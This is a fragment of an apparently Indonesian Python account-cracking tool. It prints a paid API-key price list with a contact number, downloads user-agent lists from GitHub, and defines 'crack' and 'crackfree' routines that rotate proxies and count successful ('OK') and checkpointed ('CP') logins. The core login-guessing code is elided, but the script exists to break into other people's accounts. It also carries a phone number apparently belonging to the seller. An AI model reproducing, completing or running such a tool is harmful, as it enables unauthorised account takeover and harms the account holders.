...
os.system("clear")
print("\x1b[1;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;92m┃╔═❲  Only Admin Chekout Api Key 081215437036 ❳")
print("\x1b[1;92m┃╚═════════════════════════════════")
print("\x1b[1;92m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("\x1b[1;92m┃╔═❲ List Harga Api Key Tools️ ❳═>")
print("\x1b[1;92m┃║• Api Key Mingguan : 30k")
print("\x1b[1;92m️┃║• Api Key 1 Bulan : 60k")
print("\x1b[1;92m┃║• Api Key 2 Bulan : 100k")
print("\x1b[1;92m┃║• Api Key Pertahun : 200k")
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/khoirulxd/KHOIRUL-XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r└──{sir} KHOIRUL🇮🇩{x}  {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{h}{cp}{P} CP {P}{k}{ok}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r└──{sir}[KHOIRUL]{x} 🐦 {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
